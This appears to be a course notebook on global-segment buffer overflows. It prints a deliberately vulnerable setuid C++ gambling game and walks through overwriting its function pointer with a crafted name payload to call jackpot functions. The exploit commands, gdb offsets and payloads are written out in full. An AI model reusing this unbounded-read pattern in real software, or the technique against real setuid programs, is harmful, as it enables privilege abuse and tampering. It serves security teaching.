# Global Segment Overflow
- recall function pointers are pointers that store addresses of functions/code
    - see [Function-Pointers notebook](./Function-Pointers.ipynb) for a review
- function pointers can be overwritten using overflow techniques to point to different code/function


## Lucky 7 game
- various luck-based games that're favored to the house
- program uses a function pointer to remember the last game played by the user
- the last game function's address is stored in the **User** structure
- player object is declared as an uninitialized global variable
    - meaning the memory is allocated in the **bss** segment
- seteuid multi-user program that stores player's data in /var folder
- only root or sudo user can access players' info stored in /var folder
- each player is identified by the system's user id
- examine and compile and run game programs in demos/other_overflow/ folder
- game is divided into one header file and 2 .cpp files
- use the provided Makefile found in the same folder; uses C++17 specific features such as system specific file permission
- NOTE: program must be setuid, to read/write the database file: `/var/lucky7.txt`


```python
! cat demos/other_overflow/main.cpp
```

    #include <stdio.h>
    #include <string.h>
    #include <fcntl.h>
    #include <sys/stat.h>
    #include <time.h>
    #include <stdlib.h>
    #include <unistd.h> //getuid()
    #include <sys/types.h> // getuid()
    #include <iostream>
    #include "lucky7.h"
    
    char DATAFILE[] = "/var/lucky7.txt"; // File to store players data
    
    using namespace std;
    
    // Global variables
    User player;      // Player struct
    
    int main(int argc, char* argv[]) {
       int choice, last_game = 0;
       // gives same addresses as in GDB
       //printf("player.name @ %p\n", &player.name); 
       //printf("player.current_game @ %p\n", &player.current_game);
       //last_game = 0;
       if(not read_player_data(DATAFILE,  player)) // Try to read player data from file.
          register_new_player(DATAFILE, player);    // If there is no data, register a new player.
    
       do {
          choice = get_choice(player);
    
          if (choice < 4) {
             if (choice != last_game) {
                switch(choice) {
                   case 1:
                      cout << "\n~*~*~ Lucky 7 ~*~*~\nCosts 10 credits to play this game.\n"
                      << "Machine will generate 1 random number between 1 and 9.\n"
                      << "If the number is 7, you win a jackpot of 10 THOUSAND.\n"
                      << "Otherwise, you lose.\n" << flush << endl;
                      player.current_game = lucky7;
                      break;
                   case 2:
                      cout << "\n~*~*~ Lucky 777 ~*~*~\nCosts 50 credits to play this game.\n"
                      << "Machine will generate 3 random numbers each between 1 and 9.\n"
                      << "If all 3 numbers are 7, you win a jackpot of 100 THOUSAND.\n"
                      << "If all 3 numbers match, you win 10 THOUSAND.\n"
                      << "Otherwise, you lose.\n Enter to continue..." << flush << endl;               
                      player.current_game = lucky777;
                      break;
                   case 3:
                      cout << "\n~*~*~ Lucky 77777 ~*~*~\nCosts 100 credits to play this game.\n"
                      << "Machine will generate 5 random numbers each between 1 and 9.\n"
                      << "If all 5 numbers are 7, you win a jackpot of 1 MILLION.\n"
                      << "If all 5 numbers match, you win 100 THOUSAND.\n"
                      << "Otherwise, you lose.\n Enter to continue..." << flush << endl;
                      player.current_game = lucky77777;
                      break;
                }
                last_game = choice;
             }  
             play_the_game();
          }
          else if (choice == 4)
             show_credits(player);
          else if (choice == 5) {
             change_username();
             update_player_data(DATAFILE, player);
             printf("Your name has been changed.\n\n");
          }
          else if (choice == 6)
             reset_credit(DATAFILE, player);
       
          //cin.get();
       } while(choice !=7 );
       printf("\nThanks for playing! Good Bye.\n");
    }
    
    
    // This function simply awards the jackpot for the Pick a Number game
    void jackpot10K() {
       printf("*+*+*+*+*+* JACKPOT 10 THOUSAND *+*+*+*+*+*\n");
       printf("Congratulations!\n You have won the jackpot of 10,000 (10K) credits!\n");
       player.credits += 10000;
    }
    
    // This function simply awards the jackpot for the lucky 777 game
    void jackpot100K() {
       printf("*+*+*+*+*+* JACKPOT 100 THOUSAND *+*+*+*+*+*\n");
       printf("Congratulations!!!!\n You have won the jackpot of 100,000 (100K) credits!\n");
       player.credits += 100000;
    }
    
    // This function simply awards the jackpot for the lucky 77777 game
    void jackpot1M() {
       printf("*+*+*+*+*+* JACKPOT 1 MILLION *+*+*+*+*+*\n");
       printf("!!!!Congratulations!!!!You have won the jackpot of 1,000,000 (1M) credits!\n");
       player.credits += 1000000;
    }
    
    void deduct_credits() {
       printf("\n[DEBUG] current_game pointer 0x%08x\n", (unsigned int)player.current_game);
       if (player.current_game == lucky7 and player.credits >= 10) {
          player.credits -= 10;
       }
    
       if (player.current_game == lucky777 and player.credits >= 50) {
          player.credits -= 50;
       }
    
       if (player.current_game == lucky77777 and player.credits >= 100) {
          player.credits -= 100;
       }
    }
    
    // This function contains a loop to allow the current game to be
    // played again. It also writes the new credit totals to file
    // after each game is played.
    void play_the_game() { 
       char again;
       int result;
       do {
          if (player.credits < 10) {
             cout << "Sorry, you're out of credit.\nReset your credit to 500 to play again\n";
             break;
          }
          deduct_credits();
    
          result = player.current_game(); // call current_game function ptr
          if( result == 1) // if won, give jackpot
             jackpot10K();
          else if (result == 2)
             jackpot100K();
          else if (result == 3)
             jackpot1M();
          else
             cout << "Sorry! Better luck next time...\n";
    
          printf("\nYou have %u credits\n", player.credits);
          update_player_data(DATAFILE, player); // Write the new credit total to file.
          printf("Would you like to play again? [y/n]: ");
          //selection = '\n';
          cin >> ws; // read and ignore all the whitespaces
          cin >> again;
          
       } while(again == 'y' or again == 'Y');
    }
    
    void change_username() {
       printf("\nChange user name\n");
       cout << "Enter your new name:\n";
       mgets(player.name);
    }



```python
! cat demos/other_overflow/lucky7.cpp
```

    #include <stdio.h>
    #include <string.h>
    #include <fcntl.h>
    #include <sys/stat.h>
    #include <time.h>
    #include <stdlib.h>
    #include <unistd.h> //getuid()
    #include <sys/types.h> // getuid()
    #include <iostream>
    #include <fstream>
    #include <iomanip>
    #include <filesystem> // file system specific permission
    
    #include "lucky7.h"
    
    using namespace std;
    namespace fs = std::filesystem;
    
    int get_choice(User &player) {
       int choice = 0;
       //do{
          //system("clear");
          cout << "-=[ Lucky 7 Game Menu ]=-\n";
          cout << "1 - Play Lucky 7 game\n";
          cout << "2 - Play Lucky 777 game\n";
          cout << "3 - Play Lucky 77777 game\n";
          cout << "4 - View your total credits\n";
          cout << "5 - Change your user name\n";
          cout << "6 - Reset your account at 500 credits\n";
          cout << "7 - Quit\n";
          printf("[Name: %s]\n", player.name);
          printf("[You have %u credits] ->  ", player.credits);
          cout << "Enter your choice [1-7]: ";
          cin >> choice;
        
          if ((choice < 1) || (choice > 7)) {
             cerr << "The number " << choice << " is an invalid selection.\n\n";
             return 1;
          }
    
          else 
             return choice;
    
       //} while(true);
       
    }
    
    // This is the new user registration function.
    // It will create a new player account and append it to the file
    void register_new_player(char * data_file, User &player)  { 
        cout << "-=-={ New Player Registration }=-=-\n";
        cout << "Enter your name: ";
        mgets(player.name); // get player's name
        player.uid = getuid();
        player.credits = 500;
    
        ofstream fout(data_file, ios::app);
        if(not fout) {
            cerr << "Fatal error in register_new_player() while opening " << data_file << " file\n";
            exit(-1);
        }
        
        //fout << player.uid << " " << player.credits << " " << player.name << endl;
        fout << left << setw(10) << player.uid << setw(15) << player.credits << setw(100) << player.name << endl;
        fs::permissions(data_file, fs::perms::group_read|fs::perms::others_read, fs::perm_options::remove);
        fout.close();
        printf("\nWelcome to the Lucky 7 Game %s.\n", player.name);
        printf("You have been given %u credits.\n", player.credits);
    }
    
    // This function writes the current player data to the file.
    // It is used primarily for updating the credits after games.
    void update_player_data(char * data_file, User &player) {
        int read_uid, credits;
        string name;
        fstream file(data_file, ios::out|ios::in);
        streampos position;
        if (!file) {
            cerr << "Fatal error opening file " << data_file << endl;
            exit(-1);
        }
    
        while(file >> read_uid) {  // Loop until correct uid is found
            if (read_uid == player.uid) // found our line
            {
                file.seekg(-4, ios::cur);
                file << left << setw(10) << player.uid << setw(15) << player.credits << setw(100) << player.name << endl;
                break;
            }
            else {
                file >> credits;
                getline(file, name);
            }
        }
        file.close();
    }
    
    // This function reads the current player data from db file.
    bool read_player_data(char * data_file, User &player) {
        int uid, read_uid, credits;
        string name;
        ifstream fin(data_file);
    
        uid = getuid(); // get loggedin user's id
        bool found = false;
        if (not fin) {
            cerr << "Database file doesn't exist: " << data_file << endl;
            return false;
        }
    
        while(fin >> read_uid >> credits and not found) {  // Loop until correct uid is found
            //cout << read_uid << " " << credits << endl;
            if (read_uid == uid) { // found our player's data
                player.uid = uid;
                player.credits = credits;
                fin >> ws; // read and discard trailing whitespaces
                getline(fin, name);
                strcpy(player.name, name.c_str());
                player.current_game = nullptr;
                found = true;
            }
            else {
                // read and discard player's full name
                //fin >> credits;
                getline(fin, name);
            }
        }
        fin.close();
        return found;
    }
    
    char * mgets(char *dst) {
        char *ptr = dst;
        int ch; 
    	/* skip leading white spaces */ 
        while (true) {
            ch = getchar();
            if (ch == ' ' or ch == '\t' or ch == '\n') continue;
            else break;
        }
    
        /* now read the rest until \n or EOF */ 
        while (true) {
            *(ptr++) = ch; 
            ch = getchar();
            if (ch == '\n' or ch == EOF) break;
        }
        *(ptr) = 0;
        return dst;
    }
    
    void show_credits(const User & player) {
        cout << setw(30) << setfill('=') << "\n";
        cout << "Name: " << player.name << endl;
        cout << "Credits: " << player.credits << endl;
        cout << setw(20) << "\n";
        cout << setfill(' ');
    }
    
    void printNumber(int randNumber) {
        int maxRoll = 10000;
        int num;
        for(int i=0; i<maxRoll; i++) {
            num = i%9+1;
            cout << num << flush;
            sleep(0.25);
            cout << "\b" << flush;
        }
        cout << randNumber << " " << flush;
            
    }
    
    // win jackpot of 10K if random number 7 is generated
    unsigned int lucky7() {
        cout << "the random number is: " << flush;
        int num = get_random_number(9);
        printNumber(num);
        cout << endl;
        if (num == 7) return 1; //win jackpot
        else return 0; // loss
    }
    
    // win jackpot of 100K for 3 777 numbers
    unsigned int lucky777() {
        cout << "3 random numers are: " << flush;
        int num1 = get_random_number(9);
        printNumber(num1);
    
        int num2 = get_random_number(9);
        printNumber(num2);
    
        int num3 = get_random_number(9);
        printNumber(num3);
    
        cout << endl;
        if (num1 == 7 and num2 == 7 and num3 == 7) return 2; // jackpot
        else if (num1 == num2 and num2 == num3) return 1; // normal win
        else return 0;
    }
    
    // win Jackpot of 1M if all 5 random numbers are 77777
    unsigned int lucky77777() {
        cout << "5 random numers are: " << flush;
        int num1 = get_random_number(9);
        printNumber(num1);
    
        int num2 = get_random_number(9);
        printNumber(num2);
    
        int num3 = get_random_number(9);
        printNumber(num3);
    
        int num4 = get_random_number(9);
        printNumber(num4);
    
        int num5 = get_random_number(9);
        printNumber(num5);
        cout << endl;
        if (num1 == 7 and num2 == 7 and num3 == 7 and num4 == 7 and num5 ==7) return 3;
        else if (num1 == num2 and num2 ==  num3 and num3 == num4 and num4 == num5) return 2;
        else return 0;
    }
    
    void reset_credit(char * datafile, User & player) {
       player.credits = 500;
       update_player_data(datafile, player);
    }
    
    unsigned int get_random_number(int max) {
        srand(time(0)); // Seed the randomizer with the current time.
        int num = rand()%max+1;
        return num;
    }
    
    void rstrip(string &line) {
        int last_space = line.length()-1;
        while(line[last_space] == ' ') --last_space;
        line.erase(line.begin()+last_space+1, line.end());
    }

- change current working directory to other_overflow folder where the program and Makefile are
- compile using the Makefile


```python
%cd ./demos/other_overflow
```

    /home/kali/projects/SoftwareSecurity/demos/other_overflow



```python
! echo kali | sudo -S make
```

    [sudo] password for kali: g++ -g -Wall -m32 -std=c++17 -fno-stack-protector -z execstack -no-pie lucky7.cpp main.cpp  -o lucky7.exe 
    # must run make with sudo to disable randomaize_va_space
    echo 0 | tee /proc/sys/kernel/randomize_va_space
    0
    sudo chown root:root lucky7.exe 
    sudo chmod +s lucky7.exe  



```python
# program uses /var/lucky7.txt to store player's information
# let's take a look into it if it exists.
# if the file doesn't exists, run the program to create one
! echo kali | sudo -S cat /var/lucky7.txt
# userid     credits    palaer's_full_name
```

    [sudo] password for kali: cat: /var/lucky7.txt: No such file or directory



```python
# if file exists, delete it to start fresh
! echo kali | sudo -S rm /var/lucky7.txt
```

    [sudo] password for kali: 


```python
! ls -al /var/lucky7.txt
```

    ls: cannot access '/var/lucky7.txt': No such file or directory



```python
! ls -l lucky7.exe
```

    -rwsr-sr-x 1 root root 261468 May  3 16:37 lucky7.exe


### play the interactive game
- lucky is an interactive program that doesn't work with Jupyter Notebook as of Aug. 2021
- Use Terminal to play the program; follow the menu provided by the program to play the game
- press `CTRL-Z` to temporarily suspend (put it in background) the current process
- enter `fg` command to bring the suspended program to fore ground

```bash
┌──(kali㉿K)-[~/projects/EthicalHacking/demos/other_overflow]
└─$ ./lucky7.exe                                                                                                                                                                      
Database file doesn't exist: /var/lucky7.txt
-=-={ New Player Registration }=-=-
Enter your name: John Smith
                                                                                                                             
Welcome to the Lucky 7 Game John Smith.                                                                                      
You have been given 500 credits.
-=[ Lucky 7 Game Menu ]=-
1 - Play Lucky 7 game
2 - Play Lucky 777 game
3 - Play Lucky 77777 game
4 - View your total credits
5 - Change your user name
6 - Reset your account at 500 credits
7 - Quit
[Name: John Smith]
[You have 500 credits] ->  Enter your choice [1-7]: 2

~*~*~ Lucky 777 ~*~*~
Costs 50 credits to play this game.
Machine will generate 3 random numbers each between 1 and 9.
If all 3 numbers are 7, you win a jackpot of 100 THOUSAND
If all 3 numbers match, you win 10 THOUSAND
Otherwise, you lose.
 Enter to continue...

[DEBUG] current_game pointer 0x0804b1cd
3 random numers are: 4 3 4 
Sorry! Better luck next time...

You have 450 credits
Would you like to play again? [y/n]:
```

### Find the vulnerability in the game
- do code review to find global **player** object and `change_username()`
- note **user** struct has declared name buffer of 100 bytes
- change_username() function uses `mgets()` function to read and store data into name field one character at a time until '\n'
- there's nothing to limit it to the length of the destination buffer!
- so, the game has buffer overrun/overflow vulnerability!

### Exploit the overflow vulnerability
- run the program
- explore the memory addresses of **name** and **current_game** using peda/gdb
- use gdb to debug the live process
- find the process id of lucky7.exe process

```bash
┌──(kali㉿K)-[~]
└─$ ps aux | grep lucky7.exe                          
root       30439  0.1  0.0   5476  1344 pts/2    S+   10:54   0:00 ./lucky7.exe
kali       30801  0.0  0.0   6320   724 pts/3    S+   10:59   0:00 grep --color=auto lucky7.exe


- use the process_id to debug in gdb

┌──(kali㉿K)-[~/EthicalHacking/demos/other_overflow]
└─$ sudo gdb -q --pid=59004 --symbols=./lucky7.exe

(gdb) p/x &player.name
$1 = 0x8050148

(gdb) p/x &player.current_game
$2 = 0x80501ac

(gdb) p/u 0x80501ac - 0x8050148 # (address of player.current_game) - (address of player.name)
$3 = 100
```

- notice, **name[100]** is at a lower address
- **(\*current_game)()** is at a higher address find the exact size that would overlfow the current_game
- the offset should be at least 100 bytes

### Let's overwrite the current_game's value with our controlled address

- create a string with 100As + BBBB
- detach the process from gdb and change the name with menu option 5 pasting the following buffer
- Enter 1 to play the game and the buffer should overwrite the [DEBUG] current_game pointer with 0x42424242


```python
# change the name to the following string
! python -c 'print("A"*100 + "B"*4)'
```

    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB


- run the program and play the last game after changing name

```bash
┌──(kali㉿K)-[~/projects/EthicalHacking/demos/other_overflow]
└─$ ./lucky7.exe           
Database file doesn't exist: /var/lucky7.txt
-=-={ New Player Registration }=-=-
Enter your name: John Smith

Welcome to the Lucky 7 Game John Smith.
You have been given 500 credits.
-=[ Lucky 7 Game Menu ]=-
1 - Play Lucky 7 game
2 - Play Lucky 777 game
3 - Play Lucky 77777 game
4 - View your total credits
5 - Change your user name
6 - Reset your account at 500 credits
7 - Quit
[Name: John Smith]
[You have 500 credits] ->  Enter your choice [1-7]: 1

~*~*~ Lucky 7 ~*~*~
Costs 10 credits to play this game.
Machine will generate 1 random numbers each between 1 and 9.
If the number is 7, you win a jackpot of 10 THOUSAND
Otherwise, you lose.


[DEBUG] current_game pointer 0x0804b141
the random number is: 8 
Sorry! Better luck next time...

You have 490 credits
Would you like to play again? [y/n]: n
-=[ Lucky 7 Game Menu ]=-
1 - Play Lucky 7 game
2 - Play Lucky 777 game
3 - Play Lucky 77777 game
4 - View your total credits
5 - Change your user name
6 - Reset your account at 500 credits
7 - Quit
[Name: John Smith]
[You have 490 credits] ->  Enter your choice [1-7]: 5

Change user name
Enter your new name:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
Your name has been changed.

-=[ Lucky 7 Game Menu ]=-
1 - Play Lucky 7 game
2 - Play Lucky 777 game
3 - Play Lucky 77777 game
4 - View your total credits
5 - Change your user name
6 - Reset your account at 500 credits
7 - Quit
[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB]
[You have 490 credits] ->  Enter your choice [1-7]: 1

[DEBUG] current_game pointer 0x42424242
zsh: segmentation fault  ./lucky7.exe
```

### Find useful functions/code in the program to execute
- **nm** command lists symbols in object files with corresponding addresses
    - can be used to find addresses of various functions in a program
- `jackpot()` functions are intruiging!

```bash
┌──(kali㉿K)-[~/EthicalHacking/demos/other_overflow]
└─$ nm ./lucky7.exe                                                                                              
┌──(kali㉿K)-[~/projects/EthicalHacking/demos/other_overflow]
└─$ nm ./lucky7.exe                                                                                                     139 ⨯
08050114 B __bss_start
08050120 b completed.0
         U __cxa_atexit@GLIBC_2.1.3
08050104 D DATAFILE
080500f8 D __data_start
080500f8 W data_start
0804a440 t deregister_tm_clones
0804a420 T _dl_relocate_static_pie
0804a4c0 t __do_global_dtors_aux
0804fee4 d __do_global_dtors_aux_fini_array_entry
080500fc D __dso_handle
08050100 V DW.ref.__gxx_personality_v0
0804fee8 d _DYNAMIC
08050114 D _edata
080501b4 B _end
         U exit@GLIBC_2.0
0804c3d8 T _fini
0804d000 R _fp_hw
0804a4f0 t frame_dummy
0804fed8 d __frame_dummy_init_array_entry
0804e438 r __FRAME_END__
         U getchar@GLIBC_2.0
         U getuid@GLIBC_2.0
08050000 d _GLOBAL_OFFSET_TABLE_
0804c34a t _GLOBAL__sub_I_DATAFILE
0804b5a0 t _GLOBAL__sub_I__Z10get_choiceR4User
         w __gmon_start__
0804d7e4 r __GNU_EH_FRAME_HDR
         U __gxx_personality_v0@CXXABI_1.3
0804a000 T _init
0804fee4 d __init_array_end
0804fed8 d __init_array_start
0804d004 R _IO_stdin_used
0804c3d0 T __libc_csu_fini
0804c370 T __libc_csu_init
         U __libc_start_main@GLIBC_2.0
0804bcda T main
08050140 B player
         U printf@GLIBC_2.0
         U puts@GLIBC_2.0
         U rand@GLIBC_2.0
0804a480 t register_tm_clones
         U sleep@GLIBC_2.0
         U srand@GLIBC_2.0
0804a3e0 T _start
         U strcpy@GLIBC_2.0
         U strlen@GLIBC_2.0
         U time@GLIBC_2.0
08050114 D __TMC_END__
         U _Unwind_Resume@GCC_3.0
0804bcd2 T __x86.get_pc_thunk.ax
0804c3d1 T __x86.get_pc_thunk.bp
0804a430 T __x86.get_pc_thunk.bx
0804bcd6 T __x86.get_pc_thunk.si
0804a4f2 T _Z10get_choiceR4User
0804bfeb T _Z10jackpot10Kv !!!!!!!!!<- JACKPOT ---> !!!!!!!!!!
0804b2b8 T _Z10lucky77777v
0804c038 T _Z11jackpot100Kv
0804b042 T _Z11printNumberi
0804b3fb T _Z12reset_creditPcR4User
0804aeeb T _Z12show_creditsRK4User
0804c181 T _Z13play_the_gamev
0804c0d2 T _Z14deduct_creditsv
0804c29c T _Z15change_usernamev
0804ac37 T _Z16read_player_dataPcR4User
0804b429 T _Z17get_random_numberi
0804a97f T _Z18update_player_dataPcR4User
0804a6c0 T _Z19register_new_playerPcR4User
0804b547 t _Z41__static_initialization_and_destruction_0ii
0804c2f1 t _Z41__static_initialization_and_destruction_0ii
0804ae82 T _Z5mgetsPc
0804b141 T _Z6lucky7v
0804b46d T _Z6rstripRNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE
0804b1cd T _Z8lucky777v
0804c085 T _Z9jackpot1Mv
0804b7fc W _ZN9__gnu_cxx11char_traitsIcE2eqERKcS3_
0804b81c W _ZN9__gnu_cxx11char_traitsIcE6lengthEPKc
...

```

### Script the interactive user input
- instead of typing options and commands interactively, they can be scripted and piped into the program
- program can then parse and use the input as if someone is interactively typing it from the std input stream
- make sure the game has been played atleast once by the current user
    - the following script needs to start with full name otherwise!


```python
# play game #1, y, n; 
# Enter 7 to quit
! python -c 'print("1\ny\nn\n7")'
```

    1
    y
    n
    7



```python
%pwd
```




    '/home/kali/projects/SoftwareSecurity/demos/other_overflow'




```python
! python -c 'print("1\ny\nn\n7")' | ./lucky7.exe
```

    -=[ Lucky 7 Game Menu ]=-
    1 - Play Lucky 7 game
    2 - Play Lucky 777 game
    3 - Play Lucky 77777 game
    4 - View your total credits
    5 - Change your user name
    6 - Reset your account at 500 credits
    7 - Quit
    [Name: 1                                                                                                   ]
    [You have 59930 credits] ->  Enter your choice [1-7]: 
    ~*~*~ Lucky 7 ~*~*~
    Costs 10 credits to play this game.
    Machine will generate 1 random number between 1 and 9.
    If the number is 7, you win a jackpot of 10 THOUSAND.
    Otherwise, you lose.
    
    
    [DEBUG] current_game pointer 0x0804b07c
    the random number is: 1 
    Sorry! Better luck next time...
    
    You have 59920 credits
    Would you like to play again? [y/n]: 
    [DEBUG] current_game pointer 0x0804b07c
    the random number is: 6 
    Sorry! Better luck next time...
    
    You have 59910 credits
    Would you like to play again? [y/n]: -=[ Lucky 7 Game Menu ]=-
    1 - Play Lucky 7 game
    2 - Play Lucky 777 game
    3 - Play Lucky 77777 game
    4 - View your total credits
    5 - Change your user name
    6 - Reset your account at 500 credits
    7 - Quit
    [Name: 1                                                                                                   |�]
    [You have 59910 credits] ->  Enter your choice [1-7]: 
    Thanks for playing! Good Bye.



```python
# let's replace the current_game with our own data (BBBB)
! python -c 'print("1\nn\n5\n" + "A"*100 + "BBBB\n" + "1\nn\n7")' | ./lucky7.exe
```

    -=[ Lucky 7 Game Menu ]=-
    1 - Play Lucky 7 game
    2 - Play Lucky 777 game
    3 - Play Lucky 77777 game
    4 - View your total credits
    5 - Change your user name
    6 - Reset your account at 500 credits
    7 - Quit
    [Name: 1                                                                                                   ]
    [You have 59910 credits] ->  Enter your choice [1-7]: 
    ~*~*~ Lucky 7 ~*~*~
    Costs 10 credits to play this game.
    Machine will generate 1 random number between 1 and 9.
    If the number is 7, you win a jackpot of 10 THOUSAND.
    Otherwise, you lose.
    
    
    [DEBUG] current_game pointer 0x0804b07c
    the random number is: 4 
    Sorry! Better luck next time...
    
    You have 59900 credits
    Would you like to play again? [y/n]: -=[ Lucky 7 Game Menu ]=-
    1 - Play Lucky 7 game
    2 - Play Lucky 777 game
    3 - Play Lucky 77777 game
    4 - View your total credits
    5 - Change your user name
    6 - Reset your account at 500 credits
    7 - Quit
    [Name: 1                                                                                                   |�]
    [You have 59900 credits] ->  Enter your choice [1-7]: 
    Change user name
    Enter your new name:
    Your name has been changed.
    
    -=[ Lucky 7 Game Menu ]=-
    1 - Play Lucky 7 game
    2 - Play Lucky 777 game
    3 - Play Lucky 77777 game
    4 - View your total credits
    5 - Change your user name
    6 - Reset your account at 500 credits
    7 - Quit
    [Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB]
    [You have 59900 credits] ->  Enter your choice [1-7]: 
    [DEBUG] current_game pointer 0x42424242



```python
# note the jackpot()'s address
! nm ./lucky7.exe | grep jackpot
```

    0804beab T _Z10jackpot10Kv
    0804bef8 T _Z11jackpot100Kv
    0804bf45 T _Z9jackpot1Mv



```python
# let's create a string mimicking game play with jackpot100K address!
! python -c 'import sys; sys.stdout.buffer.write(b"1\nn\n5\n" + b"A"*100 + b"\xf8\xbe\x04\x08\n" + b"1\nn\n7\n")'
# the following is the sequnce of user input to play the game
```

    1
    n
    5
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��
    1
    n
    7



```python
# now let's hit the Jackpot to receive 100K credit!
! python -c 'import sys; sys.stdout.buffer.write(b"1\nn\n5\n" + b"A"*100 + b"\xb8\xbf\x04\x08\n" + b"1\nn\n7\n")' | ./lucky7.exe
```

    -=[ Lucky 7 Game Menu ]=-
    1 - Play Lucky 7 game
    2 - Play Lucky 777 game
    3 - Play Lucky 77777 game
    4 - View your total credits
    5 - Change your user name
    6 - Reset your account at 500 credits
    7 - Quit
    [Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA]
    [You have 109280 credits] ->  Enter your choice [1-7]: 
    ~*~*~ Lucky 7 ~*~*~
    Costs 10 credits to play this game.
    Machine will generate 1 random numbers each between 1 and 9.
    If the number is 7, you win a jackpot of 10 THOUSAND
    Otherwise, you lose.
    
    
    [DEBUG] current_game pointer 0x0804b0c1
    the random number is: 5 
    Sorry! Better luck next time...
    
    You have 109270 credits
    Would you like to play again? [y/n]: -=[ Lucky 7 Game Menu ]=-
    1 - Play Lucky 7 game
    2 - Play Lucky 777 game
    3 - Play Lucky 77777 game
    4 - View your total credits
    5 - Change your user name
    6 - Reset your account at 500 credits
    7 - Quit
    [Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��]
    [You have 109270 credits] ->  Enter your choice [1-7]: 
    Change user name
    Enter your new name:
    Your name has been changed.
    
    -=[ Lucky 7 Game Menu ]=-
    1 - Play Lucky 7 game
    2 - Play Lucky 777 game
    3 - Play Lucky 77777 game
    4 - View your total credits
    5 - Change your user name
    6 - Reset your account at 500 credits
    7 - Quit
    [Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��]
    [You have 109270 credits] ->  Enter your choice [1-7]: 
    [DEBUG] current_game pointer 0x0804bfb8
    *+*+*+*+*+* JACKPOT 100 THOSAND *+*+*+*+*+*
    Congratulations!!!!
     You have won the jackpot of 100000 (100K) credits!
    Sorry! Better luck next time...
    
    You have 209270 credits
    Would you like to play again? [y/n]: -=[ Lucky 7 Game Menu ]=-
    1 - Play Lucky 7 game
    2 - Play Lucky 777 game
    3 - Play Lucky 77777 game
    4 - View your total credits
    5 - Change your user name
    6 - Reset your account at 500 credits
    7 - Quit
    [Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��]
    [You have 209270 credits] ->  Enter your choice [1-7]: 
    Thanks for playing! Good Bye.



```python
# let's hit the Jackpot 2 times in a row!
# and change to your actual name
# now let's hit the Jackpot!
! python -c 'import sys; sys.stdout.buffer.write(b"1\nn\n5\n" + b"A"*100 + b"\xb8\xbf\x04\x08\n" + b"1\ny\nn\n5\nJohn Smith\n2\nn\n7\n")' | ./lucky7.exe
```

    -=[ Lucky 7 Game Menu ]=-
    1 - Play Lucky 7 game
    2 - Play Lucky 777 game
    3 - Play Lucky 77777 game
    4 - View your total credits
    5 - Change your user name
    6 - Reset your account at 500 credits
    7 - Quit
    [Name: John Smith                                                                                          ]
    [You have 609200 credits] ->  Enter your choice [1-7]: 
    ~*~*~ Lucky 7 ~*~*~
    Costs 10 credits to play this game.
    Machine will generate 1 random numbers each between 1 and 9.
    If the number is 7, you win a jackpot of 10 THOUSAND
    Otherwise, you lose.
    
    
    [DEBUG] current_game pointer 0x0804b0c1
    the random number is: 9 
    Sorry! Better luck next time...
    
    You have 609190 credits
    Would you like to play again? [y/n]: -=[ Lucky 7 Game Menu ]=-
    1 - Play Lucky 7 game
    2 - Play Lucky 777 game
    3 - Play Lucky 77777 game
    4 - View your total credits
    5 - Change your user name
    6 - Reset your account at 500 credits
    7 - Quit
    [Name: John Smith                                                                                          ��]
    [You have 609190 credits] ->  Enter your choice [1-7]: 
    Change user name
    Enter your new name:
    Your name has been changed.
    
    -=[ Lucky 7 Game Menu ]=-
    1 - Play Lucky 7 game
    2 - Play Lucky 777 game
    3 - Play Lucky 77777 game
    4 - View your total credits
    5 - Change your user name
    6 - Reset your account at 500 credits
    7 - Quit
    [Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��]
    [You have 609190 credits] ->  Enter your choice [1-7]: 
    [DEBUG] current_game pointer 0x0804bfb8
    *+*+*+*+*+* JACKPOT 100 THOSAND *+*+*+*+*+*
    Congratulations!!!!
     You have won the jackpot of 100000 (100K) credits!
    Sorry! Better luck next time...
    
    You have 709190 credits
    Would you like to play again? [y/n]: 
    [DEBUG] current_game pointer 0x0804bfb8
    *+*+*+*+*+* JACKPOT 100 THOSAND *+*+*+*+*+*
    Congratulations!!!!
     You have won the jackpot of 100000 (100K) credits!
    Sorry! Better luck next time...
    
    You have 809190 credits
    Would you like to play again? [y/n]: -=[ Lucky 7 Game Menu ]=-
    1 - Play Lucky 7 game
    2 - Play Lucky 777 game
    3 - Play Lucky 77777 game
    4 - View your total credits
    5 - Change your user name
    6 - Reset your account at 500 credits
    7 - Quit
    [Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��]
